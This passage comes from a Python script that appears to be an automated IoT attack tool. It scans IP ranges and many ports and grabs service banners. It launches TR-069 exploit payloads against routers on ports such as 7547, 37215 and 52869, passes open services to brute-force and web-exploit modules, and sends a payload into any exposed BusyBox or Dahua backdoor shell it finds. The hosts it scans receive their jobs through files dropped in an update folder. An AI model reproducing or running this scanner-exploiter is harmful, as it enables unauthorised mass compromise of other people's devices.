		log_session( "%s:%d TR:%s" % ( tr69task_ref[webhash][0], tr69task_ref[webhash][1], tr69task_lastresponse[webhash] ) )

	tr69task_payloadindex[webhash] = None
	tr69task_ref[webhash] = None
	tr69task_nextconnectiontime[webhash] = None
	tr69task_currentsock[webhash] = None
	tr69task_lastresponse[webhash] = None
	tr69task_jobs.remove(webhash)
	
def tr69client_close( sock ):
	global tr69client_maxattempts
	global tr69client_waitbetweenattempts
	global tr69client_maxconnectiontime_clientrequest
	
	webhash = hash(sock)
	jobhash = tr69client_master[webhash]
	
	try:
		sock.close()
	except:
		pass

	setkeepalive = 0

	tr69task_lastresponse[jobhash] = '';
	try:
		tr69task_lastresponse[jobhash] = tr69client_response[webhash].split('\n')[0].strip()
	except:
		pass
	
	tr69task_payloadindex[jobhash] += 1

	# set master structs in accordance
	# here allow for a custom next-attempt time (e.g. in case we have a nag screen)
	curtime = time.time()
	if tr69task_nextconnectiontime[jobhash] <= curtime:
		tr69task_nextconnectiontime[jobhash] = time.time() + tr69client_waitbetweenattempts
	tr69task_currentsock[jobhash] = None
  
	tr69client_socks.remove(sock)
	tr69client_ref[webhash] = None
	tr69client_state[webhash] = None
	tr69client_request[webhash] = None
	tr69client_response[webhash] = None
	tr69client_connectiontime[webhash] = None
	tr69client_master[webhash] = None
	
def tr69task_update():
	global tr069payloads

	curtime = time.time()
	temptasks = tr69task_jobs
	for task in temptasks:
		jobhash = hash(task)
		if tr69task_currentsock[jobhash] == None:
			# Are we done?
			if tr69task_payloadindex[jobhash] >= len( tr069payloads ):
				# yes - call it quits for this job
				tr69task_close(jobhash)
				continue
		
			# time to create another socket?
			if curtime >= tr69task_nextconnectiontime[jobhash]:
				newsock = tr69client_create( tr69task_ref[jobhash][0], tr69task_ref[jobhash][1], generate_tr069_payload( tr69task_ref[jobhash][1], tr69task_payloadindex[jobhash] ), jobhash )
				tr69task_currentsock[jobhash] = newsock
				tr69task_nextconnectiontime[jobhash] = 0


def tr69client_push_request( sock, webhash, jobhash ):
	try:
		sock.send( tr69client_request[webhash] )
	except:
		pass
		
	return 1
				
def tr69client_update():
	global tr69client_maxconnectiontime_clientrequest
	global tr69client_maxconnectiontime_payload
	
	curtime = time.time()

	# process sockets
	socktimeout = 0.01
	readable, writable, errored = select.select(tr69client_socks, tr69client_socks, [], socktimeout)
	for sock in tr69client_socks:
		webhash = hash(sock)
		sockopt = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		if sockopt != 0:
			if tr69client_response[webhash] == '':
				tr69client_response[webhash] = '(timeout)';
			tr69client_close( sock )
			continue
		if sock in readable:
			data = ''
			try:
				data = sock.recv(2048)
			except:
				pass
			if data:
				tr69client_response[webhash] += data
				# are we done? If there is a Content-Length header item we can
				# try to figure out if we have all the bytes we will get, otherwise
				# we will just wait for connection to die or timeout
				headerendindex = tr69client_response[webhash].find('\r\n\r\n')
				if headerendindex >= 0:
					headerendindex += 4
				else:
					headerendindex = tr69client_response[webhash].find('\n\n')
					if headerendindex >= 0:
						headerendindex += 2
					
				if headerendindex >= 0:
					# should really be more than 0 to be a valid HTTP reply!
					matches = re.search('Content-Length:\s*(\d+)', tr69client_response[webhash])
					if matches:
						contentlength = int(matches.group(1))
						if len(tr69client_response[webhash])-headerendindex == contentlength:
							# won't get any more data, just close socket
							tr69client_close(sock)
							continue
				
			else:
				tr69client_close(sock)
				continue
		if sock in writable:
			if tr69client_state[webhash] == 0:
				# expecting request
				jobhash = tr69client_master[webhash] 
				tr69client_push_request( sock, webhash, jobhash )
				tr69client_state[webhash] = 1
				
		timetarget = tr69client_maxconnectiontime_clientrequest
		jobhash = tr69client_master[webhash] 
		if curtime - tr69client_connectiontime[webhash] > timetarget:
			if tr69client_response[webhash] == '':
				tr69client_response[webhash] = '(timeout)';
			tr69client_close(sock)
			continue
	

################################ tr69 payload module end #####################################

# marker for splitting file into smaller parts for piecemeal parsing
splitvar = "SPLTX"


# port stats stuff

stats_inboundcount = {}
stats_inboundports = []
stats_inboundips = []
stats_inboundcache = {}

def stats_register_inport( ip, port ):
	global stats_inboundcount
	global stats_inboundports
	global stats_inboundcache
	global stats_inboundips
	# use fake port 0 for a port-agnostic stat
	if port > 0:
		stats_register_inport( ip, 0 )
	tag = hash( ( ip, port ) )
	if tag in stats_inboundcache:
		return
	stats_inboundcache[tag] = 1
	if not port in stats_inboundports:
		stats_inboundports.append( port )
	if not port in stats_inboundcount or stats_inboundcount[port] == None:
		stats_inboundcount[port] = 0
	if port:
		ipport = "%s:%d" % ( ip, port )
		if not ipport in stats_inboundips:
			stats_inboundips.append( ipport )
	stats_inboundcount[port] += 1
  
def stats_get_report():
	global stats_inboundcount
	global stats_inboundports
	global stats_inboundcache
	global stats_inboundips
	report = 'INPST:'	
	for port in stats_inboundports:
		report += ' %d:%d' % (port, stats_inboundcount[port])
	return report

def stats_get_iptags():
	global stats_inboundcount
	global stats_inboundports
	global stats_inboundcache
	global stats_inboundips
	report = 'INPSI:'	
	for ipport in stats_inboundips:
		report += ' %s' % ipport
	return report

def stats_clear():
	global stats_inboundcount
	global stats_inboundports
	global stats_inboundcache
	global stats_inboundips
	stats_inboundcount = {}
	stats_inboundports = []
	stats_inboundips = []
	stats_inboundcache = {}



def rescan_add( job ):
	jobtime = job[0]
	queuesize = len(rescanqueue)
	# deal with the easy cases first
	if queuesize == 0:
		rescanqueue.append(job)
		return
	if rescanqueue[0][0] < jobtime:
		rescanqueue.insert( 0, job )
		return
	if rescanqueue[queuesize-1][0] > jobtime:
		rescanqueue.append(job)
		return
	# now divide search	
	startrange = 0
	endrange = queuesize-1
	while True:
		if endrange - startrange <= 1:
			if rescanqueue[startrange][0] > jobtime:
				rescanqueue.insert(endrange,job)
				return
			rescanqueue.insert(startrange,job)
			return
		midrange = int( ( startrange + endrange ) / 2 )
		if rescanqueue[midrange][0] > jobtime:
			startrange = midrange
		else:
			if rescanqueue[midrange][0] == jobtime:
				rescanqueue.insert(midrange,job)
				return
			endrange = midrange

	
def rescan_pop( timeval ):
	retbuf = []
	while len(rescanqueue) > 0 and rescanqueue[len(rescanqueue)-1][0] <= timeval:
		retbuf.append(rescanqueue.pop())
	return retbuf

def rescan_verify():
	for i in range(len(rescanqueue) - 1):
		if rescanqueue[i][0] < rescanqueue[i+1][0]:
			return 1
	return 0
    
def handle_incoming( ip, port ):
	global scanrandomcount

	# some kind of scan loop could occur?
	global myip
	if ip == myip:
		return

	# push everything in our scan queue for now
	taskcount = scanretry * len(scanports) + scanrandomcount
	if len( scantasks ) >= taskcount:
		# mix in these reqs with the current scan queue for variety
		taskstep = int(len(scantasks) / taskcount) + 1
		taskcount = 0
		for count in range(scanretry): 
			for scanport in scanports:
				scantasks.insert( taskcount, "%s:%d" % ( ip, scanport ) )
				taskcount += taskstep
		for randport in range(scanrandomcount):
			scantasks.insert( taskcount, "%s:%d" % ( ip, random.randint( 1, 65535 ) ) )
			taskcount += taskstep
	else:
		for randport in range(scanrandomcount):
			scantasks.insert( 0, "%s:%d" % ( ip, random.randint( 1, 65535 ) ) )
		for count in range(scanretry): 
			for scanport in scanports:
				scantasks.insert( 0, "%s:%d" % ( ip, scanport ) )

def handle_specific_port( ip, scanport ):
	# some kind of scan loop could occur?
	global myip
	if ip == myip:
		log_session( 'NOTC: Ignoring sentinel IP %s' % (myip) )
		return

	# push everything in our scan queue for now
	taskcount = scanretry * len(scanports)
	if len( scantasks ) >= taskcount:
		# mix in these reqs with the current scan queue for variety
		taskstep = int(len(scantasks) / taskcount) + 1
		taskcount = 0
		scantasks.insert( taskcount, "%s:%d" % ( ip, scanport ) )
		taskcount += taskstep
	else:
		# just doing single attempt, since scanretry for single port clusters things
		# too closely on idle scanners (multi-logins)
		scantasks.insert( 0, "%s:%d" % ( ip, scanport ) )

def new_scantask():
	if not execSC:
		return 
	# just fire up next scantask
	if len(scantasks) > 0:
		scantask = scantasks.pop();
		scanarg = scantask.split(':')
		iphash = hash(scantask)
		if iphash in scansuccesscache:
			return
		scantuple = ( scanarg[0], int(scanarg[1]) )
		newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		newsock.setblocking(0)
		sockhash = hash(newsock)
		scanstarttime[sockhash] = time.time()
		try:
			newsock.connect(scantuple)
		except:
			pass
		scansockbuf.append(newsock)
		scantaskreference[sockhash] = scantask

def close_scantask( scansock ):
	global showSD
	global showBL
	global showSO
	global showSR
	global execWP
	global execBR
	global srignoreports

	try:
		scansock.close()
	except:
		pass
	scansockbuf.remove(scansock)
	sockhash = hash(scansock)
	# did we have a success we should report?
	if sockhash in scanstate and not scanstate[sockhash] == None:
		# had a writable socket at least..
		# TODO: BUG - sometimes we get phantom sockets here.. socket writability not
		# a good measure of whether it's open? 
		if sockhash in scanresults and not scanresults[sockhash] == None and len(scanresults[sockhash]) > 2:
			philtered = re.sub( '^!', '', scanresults[sockhash] )
			philtered = re.sub( '\s\s+', ' ', philtered )
			if sockhash in scanopportunistic and not scanopportunistic[sockhash] == None:
				if showSD:
					if showBL:
						log_session( "%s SD:%s:%s" % ( scantaskreference[sockhash], scanopportunistic[sockhash], philtered[:32] ) )
					else:
						log_session( "%s SD:%s:%s" % ( scantaskreference[sockhash], scanopportunistic[sockhash], philtered[:2560] ) )
			else:
				# pass over to bruteforcer
				brutearg = scantaskreference[sockhash].split(':')
				bruteip = brutearg[0]
				bruteport = int(brutearg[1])
				if showSR or bruteport in srignoreports:
					log_session( "%s SR:%s" % ( scantaskreference[sockhash], philtered[:512] ) )
				# new logic - if first 5 characters are HTTP/ assume it's a web server regardless of port
				if 'HTTP/' in philtered[:5]:
					# probably web service
					if execWP:
						webtask_create( bruteip, bruteport, bruteip + '%%%' + 'PORT:%d:' % ( bruteport ) + philtered[:1024] )
						if bruteport == 5555 or bruteport == 7547 or bruteport == 4567 or bruteport == 37215 or bruteport == 52869 or 'Server: RomPager/4.07 UPnP/1.0' in philtered:
							# try the TR069 payload as well
							tr69task_create( bruteip, bruteport )
				else:
					# huawei emergency hack
					if bruteport == 37215 or bruteport == 52869:
						tr69task_create( bruteip, bruteport )
					# probably not a web service
					if execBR:
						if bruteport != 6789 and bruteport != 19058 and bruteport != 37215 and bruteport != 52869:
							# also ignore typical SSH etc banners
							if not 'SSH' in philtered[:10] and not ( 'FTP' in philtered and '220' in philtered ) and not "RFB 004" in philtered and not "220-FileZilla" in philtered:
								brutemaster_create( bruteip, bruteport, 'PORT:%d:' % ( bruteport ) + philtered[:512] )
				
			# remove remaining rescan queue jobs for the IP, push into abort queue if needed
			rescanarg = scantaskreference[sockhash].split(':')
			if hash(rescanarg[0]) in rescanipcache:
				rescanabort.append(rescanarg)
		else:
			if showSO:
				log_session( "%s SO" % ( scantaskreference[sockhash] ) )
			# if we aren't trying to rescan this IP:port yet we'll add it to our rescan cache
			rescanarg = scantaskreference[sockhash].split(':')
			rescanip = rescanarg[0]
			rescanport = int(rescanarg[1])
			if not rescanport in scanwebports:
				rescaniphash = hash(rescanip)
				if not rescaniphash in rescanipcache or rescanipcache[rescaniphash] == None:
					rescanipcache[rescaniphash] = 1
					curtime = time.time()
					for timedelta in rescanminutes:
						rescantime = curtime + timedelta * 60
						rescanjob = ( rescantime, rescanip, rescanport )
						rescan_add( rescanjob )
	scanstarttime[sockhash] = None
	scantaskreference[sockhash] = None
	scanstate[sockhash] = None
	scanresults[sockhash] = None
	scanopportunistic[sockhash] = None


def update_scantask():
	global scantime
	global dynamicchecktime
	curtime = time.time()
	tempsockbuf = scansockbuf
	scanactive = 0
	readable, writable, errored = select.select([], tempsockbuf, [], 0.01)
	for scansock in tempsockbuf:
		sockhash = hash(scansock)
		sockopt = scansock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		if sockopt != 0:
			close_scantask( scansock )
			continue
		scanactive = 1
		if scansock in writable:
			if not sockhash in scanstate or scanstate[sockhash] == None:
				# Bug? Sometimes socks can be writable even if they are not open! do a test of trying
				# to write nothing and see if it errors out
				try:
					scansock.send( "" );
				except:
					# not really writable!
					close_scantask( scansock )
					continue

				scanstate[sockhash] = 1
				# if this is a web port push a web request to get a header
				scanargs = scantaskreference[sockhash].split(':');
				targetip = scanargs[0];
				targetport = int( scanargs[1] );
				# port-specific hardcoded actions
				if targetport in scanwebports:
					scanstate[sockhash] = 2
					try:
						scansock.send( 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % ( targetip ) )
					except:
						pass
				elif targetport == 6789 or targetport == 19058:
					scanstate[sockhash] = 2
					try:
						scansock.send( 'shell\n' );
					except:
						pass
		data=''
		try:
			data=scansock.recv(512)
		except:
			pass
		# telnet handshake crap, at least MikroTik requires a reply
		try:
			for do in re.findall('\xff\xfd.', data ):		# IAC DO cmd
				scansock.send('\xff\xfc'+do[2])		# IAC WONT cmd
			for will in re.findall('\xff\xfb.', data):	# IAC WILL cmd
				scansock.send('\xff\xfe'+will[2])	# IAC DONT cmd
		except:
			pass
		if data:
			if not sockhash in scanstate or scanstate[sockhash] != 3: 
				scansuccesscache[hash(scantaskreference[sockhash])] = 1
			scanstate[sockhash] = 3
			# philter data into a banner string
			data = re.sub( '\r?\n', ';', data )
			data = re.sub( '[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', data )
			if sockhash in scanresults and not scanresults[sockhash] == None:
				scanresults[sockhash] += data
			else:
				scanresults[sockhash] = data
			# can we perform any opportunistic actions against this banner?
			if not sockhash in scanopportunistic or scanopportunistic[sockhash] == None:
				if ( re.search( 'BusyBox v.*#', scanresults[sockhash] ) and not 'OpenWrt' in scanresults[sockhash] ) or 'shell: ' in scanresults[sockhash] or re.search( '/\S* # ', scanresults[sockhash] ):
					targetport = int(scantaskreference[sockhash].split(':')[1]);
					if targetport == 6789 or targetport == 19058:
						scanopportunistic[sockhash] = "DahuaBackdoor"
					else:
						scanopportunistic[sockhash] = "BusyBox"
					try:
						scansock.send(busyboxpayload)
					except:
						pass
					scanstarttime[sockhash] = time.time()
			maxdatasize = 512
			if sockhash in scanopportunistic and not scanopportunistic[sockhash] == None:
				maxdatasize = 2560
			if len( scanresults[sockhash] ) >= maxdatasize:
				close_scantask( scansock )
		else:
			# new logic - if this is a non-configured scan port then push
			# a http request if we haven't received any banner after N seconds
			if sockhash in scanstate and scanstate[sockhash] == 1:
				if curtime - scanstarttime[sockhash] > dynamicchecktime:
					scanstate[sockhash] = 2;
					targetip = scantaskreference[sockhash].split(':')[0];
					try:
						scansock.send( 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % ( targetip ) )
					except:
						pass
			if ( curtime - scanstarttime[sockhash] > scantime ):
				close_scantask( scansock )
  	
# simple xor encoding helpers .. obviously not intended for security-critical stuff..
# but they'll do for some basic stats polling without the need for ssl/ssh overhead
def xor_string(data, key, encode=False, decode=False):
	# do we have os.urandom() ? Check .. should give us N bytes that are usable for simple encoding
	# random ? random.random() should give us 0.0 - 1.0.. random.uniform( min, max ) for port
	# what about subprocess ? os.popen ? os.system ?
	# this works: int( random.uniform( 30000, 50000 ) )
	if decode:
		data = binascii.a2b_base64(data)
	xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
	if encode:
		return binascii.b2a_base64(xored).strip()
	return xored

def logsystemstats():
	global sentinellaunchtime
	global lastsystemram

	curtime = time.time()

	log_session( "STAT V: %d SCT: %d RSQ: %d BFJ: %d WPT: %d PUT: %d TRT: %d XMP: %d" % ( sentinelbuild, len(scantasks), len(rescanqueue), len(brutemaster_jobs), len(webtask_jobs), int( curtime - sentinellaunchtime ), len(tr69task_jobs), len(xmpintask_jobs) ) )
	# check if there are any new config imports
	should_reload = False
	try:
		if os.path.isfile('/tmp/system/update/sentinel.reload'):
			should_reload = True
			os.remove('/tmp/system/update/sentinel.reload')
	except:
		pass
	
	should_shutdown = False
		
	if curtime - sentinellaunchtime > ( 17 * 3600 ) and lastsystemram < 1100:
                # restart if ram getting too low
		log_session( 'NOTC: RAM low - attempting process restart' )
		should_shutdown = True		
		
	if should_shutdown:
		# try to close listeners cleanly just in case to prevent hung sockets
		for listensock in listensockbuf:
			try:
				listensock.close()
			except:
				pass
		sys.exit(0)

	if should_reload:
		log_session('NOTC: Sentinel reloading config.')
		loadconfig( '/tmp/system/control.cfg' )	

	# check if there are any new job tasks for us - do all individual ips in one go, but
	# stop on first subnet scan (dont want too many subnet scans in one go)
	scanskipcount = 0
	try:
		updatedir = os.listdir( '/tmp/system/update' )
		for file in updatedir:
			matches = re.search( '^sentinel\.jobreq\.SCN\.(\S+)\.(\d+\.\d+\.\d+\.)(\d+)\-(\d+)', file )
			if matches:
				if lastsystemram > 2100:
					jobid = matches.group(1)
					subnet = matches.group(2)
					oct1 = int(matches.group(3))
					oct2 = int(matches.group(4))
					log_session("NOTC: SCN ref %s for range %s%d - %s%d" % (jobid,subnet,oct1,subnet,oct2))
					os.remove( '/tmp/system/update/' + file )
					for octet in range(oct1,oct2+1):
						ip = subnet+'%d'%(octet)
						handle_incoming( ip, 1 )
					break
				else:
					log_session("NOTC: Skipping SCN due to low system RAM %d" % ( lastsystemram ))
					scanskipcount += 1
			matches = re.search( '^sentinel\.jobreq\.SCN\.(\S+)\.(\d+\.\d+\.\d+\.\d+)', file )
			if matches:
				jobid = matches.group(1)
				ip = matches.group(2)
				log_session("NOTC: SCN ref %s for ip %s" % (jobid,ip))
				os.remove( '/tmp/system/update/' + file )
				handle_incoming( ip, 1 )
				continue
			matches = re.search( '^sentinel\.jobreq\.SCP\.(\S+)\.(\d+)_(\d+\.\d+\.\d+\.)(\d+)\-(\d+)', file )
			if matches:
				jobid = matches.group(1)
				scanport = int(matches.group(2))
				if lastsystemram > 1700 or scanport >= 20:
					subnet = matches.group(3)
					oct1 = int(matches.group(4))
					oct2 = int(matches.group(5))
					log_session("NOTC: SCP ref %s for range %s%d - %s%d port %d" % (jobid,subnet,oct1,subnet,oct2,scanport))
					os.remove( '/tmp/system/update/' + file )
					# ugly hack - if port is 1 or 2 do some common basic sets
					if scanport == 1:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 7547 )
							handle_specific_port( ip, 9527 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 2:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 7547 )
							handle_specific_port( ip, 5555 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 3:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 4:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 60023 )
							handle_specific_port( ip, 4719 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 5:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 82 )
							handle_specific_port( ip, 88 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 8081 )
							handle_specific_port( ip, 8181 )
							handle_specific_port( ip, 8888 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 6:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 2323 )
							handle_specific_port( ip, 23231 )
							handle_specific_port( ip, 23123 )
							handle_specific_port( ip, 5358 )
							handle_specific_port( ip, 6789 )
							handle_specific_port( ip, 8023 )
							handle_specific_port( ip, 60023 )
							handle_specific_port( ip, 4719 )
							handle_specific_port( ip, 9527 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 7:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 8888 )
							handle_specific_port( ip, 8090 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 8081 )
							handle_specific_port( ip, 8082 )
							handle_specific_port( ip, 1080 )
							handle_specific_port( ip, 5000 )
							handle_specific_port( ip, 3000 )
							handle_specific_port( ip, 9999 )
							handle_specific_port( ip, 8000 )
							handle_specific_port( ip, 10000 )
							handle_specific_port( ip, 9000 )
							handle_specific_port( ip, 8001 )
							handle_specific_port( ip, 5555 )
							handle_specific_port( ip, 8088 )
							handle_specific_port( ip, 8099 )
							handle_specific_port( ip, 1024 )
							handle_specific_port( ip, 8181 )
							handle_specific_port( ip, 9090 )
							handle_specific_port( ip, 8880 )
							handle_specific_port( ip, 8085 )
							handle_specific_port( ip, 8002 )
							handle_specific_port( ip, 4040 )
							handle_specific_port( ip, 2222 )
							handle_specific_port( ip, 8022 )
							handle_specific_port( ip, 8020 )
							handle_specific_port( ip, 5050 )
					elif scanport == 9:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 7547 )
							handle_specific_port( ip, 5555 )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 10:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 11:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 26 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 82 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 7547 )
							handle_specific_port( ip, 8023 )
							handle_specific_port( ip, 10023 )
							handle_specific_port( ip, 9000 )
							handle_specific_port( ip, 60001 )
							handle_specific_port( ip, 60023 )
							handle_specific_port( ip, 23231 )
							handle_specific_port( ip, 9527 )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 12:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 82 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 8023 )
							handle_specific_port( ip, 60023 )
							handle_specific_port( ip, 23231 )
							handle_specific_port( ip, random.randint( 1, 65535 ) )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
					elif scanport == 13:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, 23 )
							handle_specific_port( ip, 2323 )
							handle_specific_port( ip, 80 )
							handle_specific_port( ip, 81 )
							handle_specific_port( ip, 8080 )
							handle_specific_port( ip, 7547 )
							handle_specific_port( ip, 37215 )
							handle_specific_port( ip, 52869 )
							handle_specific_port( ip, 60001 )
					else:
						for octet in range(oct1,oct2+1):
							ip = subnet+'%d'%(octet)
							handle_specific_port( ip, scanport )
					break
				else:
					scanskipcount += 1
			else:
				matches = re.search( '^sentinel\.jobreq\.SCP\.(\S+)\.(\d+)_(\d+\.\d+\.\d+\.\d+)', file )
				if matches:
					jobid = matches.group(1)
					scanport = int(matches.group(2))
					ip = matches.group(3)
					log_session("NOTC: SCP ref %s for ip %s port %d" % (jobid,ip,scanport))
					os.remove( '/tmp/system/update/' + file )
					handle_specific_port( ip, scanport )
					continue
	except:
		pass
		


# just to keep flakier devices from rebooting while parsing this					
time.sleep(3)


# preparations for main loop
listencount = 0
needrescancacherebuild = False
for port in listenports:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	try:
		sock.bind(('0.0.0.0', int(port)))
		sock.listen(5)
		listensockbuf.append(sock)
		listensockcache[int(port)]=sock
		listencount += 1
	except:
		pass
  
# main loop
log_session( "Sentinel Process Launch (%d listeners)" % ( listencount ) )


periodictime1 = time.time()
periodictime2 = 0
periodictime3 = time.time()
periodictime4 = time.time()

while True:
	CONTROLmainloop()
	
	curtime = time.time()
	brutemaster_update()
	bruteforce_update()
	webtask_update()
	tr69task_update()
	webclient_update()
	tr69client_update()
	xmpintask_update()
	xmpinclient_update()
	honeypot_update()
	readable, writable, errored = select.select(listensockbuf, [], [], 0.01)
	for listensock in readable:
		try:
			connection, client_address = listensock.accept()
		except:
			continue
		remote_ip, remote_port = client_address
		iphash = hash(remote_ip)
		if iphash in listenipcache:
			try:
				connection.close()
			except:
				pass
			continue
		listenipcache[iphash] = 1
		target_ip, target_port = connection.getsockname()
		if target_port in listenwebports:
			# web port - listen for header chatter
			listenhttpbuf.append(connection)
			connhash = hash(connection)
			listenhttpstat[connhash] = '%s:%d>%s:%d' % ( remote_ip, remote_port, target_ip, target_port )
		else:
			if showTN:
				log_session( '%s:%d>%s:%d TN' % ( remote_ip, remote_port, target_ip, target_port ) )
			handle_incoming( remote_ip, target_port )
			stats_register_inport( remote_ip, target_port )
			# if this port is of interest we will direct it to a honeypot listener
			if CONTROLsentinelexecHP == 1 and ( target_port == 23 or target_port == 2323 ):
				handle_honeypot_telnet( connection, remote_ip, target_port )
			else:
				try:
					connection.close()
				except:
					pass
	readable, writable, errored = select.select(listenhttpbuf, [], [], 0.01)
	for websock in readable:
		data = recv_timeout(websock,1)
		connhash = hash(websock)
		if data:
		  if re.search( 'mips-unknown-linux-gnu', data ):
				log_session( "%s MF" %( listenhttpstat[connhash] ) )
				remoteargs = listenhttpstat[connhash].split(':')
				handle_incoming( remoteargs[0], int(remoteargs[2]) )
				stats_register_inport( remoteargs[0], 80 )
		try:
			websock.close()
		except:
			pass
		listenhttpbuf.remove(websock)
		listenhttpstat[connhash] = None
	# we only do maintenance tasks every N seconds..
	if curtime - periodictime1 > 3:
		taskiter = min(max(len(scantasks) / 100, 3),30)
		for i in range( taskiter ):
			new_scantask()		
		update_scantask()
		periodictime1 = curtime
	if curtime - periodictime2 > 300:
		logsystemstats()
		# a little opportunistic garbage collection
		if scanactive == 0 and len(scantasks) == 0:
			scansockbuf = []
			scansuccesscache = {}
			scantaskreference = {}
			scanstate = {}
			scanstarttime = {}
			scanresults = {}
			scantasks = []
		if len(rescanabort):
			newrescanqueue = []
			for job in rescanqueue:
				shouldnuke = 0
				for testjob in rescanabort:
					if testjob[0] == job[1] and int(testjob[1]) == int(job[2]):
						shouldnuke = 1
						break
				if not shouldnuke:
					newrescanqueue.append(job)
			rescanqueue = newrescanqueue
			rescanabort = []
		if needrescancacherebuild:
			newrsc = {}
			for job in rescanqueue:
				newrsc[hash(job[1])] = 1
			rescanipcache = newrsc
			needrescancacherebuild = False
		rescanjobs = rescan_pop( time.time() )
		for job in rescanjobs:
			rescanip = job[1]
			rescanport = int( job[2] )
			scantasks.insert( 0, "%s:%d" % ( rescanip, rescanport ) )	
			needrescancacherebuild = True
		periodictime2 = curtime
	if curtime - periodictime3 > 28800:
		# every 8 hours perform some house cleaning
		listenipcache = {}
		periodictime3 = curtime
	if curtime - periodictime4 > 3600:
		# hourly scan stats
		statsreport = stats_get_report()
		if len(statsreport) >= 8:
			log_session( statsreport )
			log_session( stats_get_iptags() )
		stats_clear()
		periodictime4 = curtime
	# force a sleep to avoid flatlining CPU
	time.sleep( 0.01 )
		
